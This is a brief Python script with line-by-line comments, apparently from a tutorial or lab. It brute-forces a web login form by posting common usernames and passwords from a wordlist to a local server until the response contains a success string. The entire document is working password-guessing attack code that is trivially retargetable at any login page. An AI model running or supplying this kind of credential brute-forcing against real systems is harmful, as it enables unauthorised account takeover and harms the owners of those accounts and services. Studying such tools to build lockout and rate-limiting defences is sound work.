import requests  
import sys       

# Set the target URL, usernames to try, password file, and the string to search for in the response
target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back"

# Loop through each username
for username in usernames:
    # Open the password file in read mode
    with open(passwords, "r") as passwords_list:
        # Loop through each password in the file
        for password in passwords_list:
            # Strip the newline character and encode the password as bytes
            password = password.strip("\n").encode()
            # Write a message to stdout indicating the current username and password being tried
            sys.stdout.write("[X] Attempting user:password -> {}: {}\r".format(username, password.decode()))
            # Flush the stdout buffer to ensure message is printed immediately
            sys.stdout.flush()
            # Send a POST request to the target URL with the current username and password combination
            r = requests.post(target, data={"username": username, "password": password})
            # If the needle string is found in the response, print a success message and exit the script
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
            # Print a newline character to stdout
            sys.stdout.write("\n")
        # If no password was found for the current username, print a message indicating so
        sys.stdout.write("\tNo password found for '{}'!".format(username))